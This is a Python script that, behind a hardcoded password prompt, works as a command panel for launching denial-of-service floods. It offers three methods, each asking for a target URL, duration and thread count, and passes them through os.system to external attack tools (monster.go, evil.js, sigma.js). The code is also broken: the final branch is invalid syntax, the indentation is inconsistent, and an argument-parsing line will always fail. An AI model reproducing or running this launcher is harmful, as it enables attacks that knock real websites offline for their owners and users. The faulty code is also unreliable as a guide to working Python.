# Define the password
correct_password = "nwhsecurity"

# Ask the user for input
user_password = input("Enter the password: ")

# Check if the input matches the correct password
if user_password == correct_password:
    print("Access granted! You can now use the protected panel.")
else:
    print("Access denied! Incorrect password.")


import sys
import os
import time

def clear():
	os.system('cls' if os.name == 'nt' else 'clear')

#proxylist = open('proxy.txt').readlines()

methodsl7 = """
monster
evil
sigma
"""
print(methodsl7)

cnc = input("root@panel $ ")

if "monster" in cnc:
            try:
                url = input("Enter the Target URL : ")
                method = cnc.split()[2]
                os.system(f'go run monster.go -site {url}')
            except IndexError:
                print('install go lang in system')


elif "evil" in cnc:
            try:
                url = input('Enter the Target URL : ')
                time = input('Enter time in seconds : ')
                os.system(f'node evil.js {url} {time}')
            except IndexError:
                print('install nodejs in system')


 else "sigma" in cnc:
             try:
                url = input('Enter the Target URL : ')
                time = input('Enter the Time in seconds: ')
                per = input('Enter the threads : ')
                os.system(f'node sigma.js {url} {time} {per} uam.txt')
            except IndexError:
                print('fatal error')
                

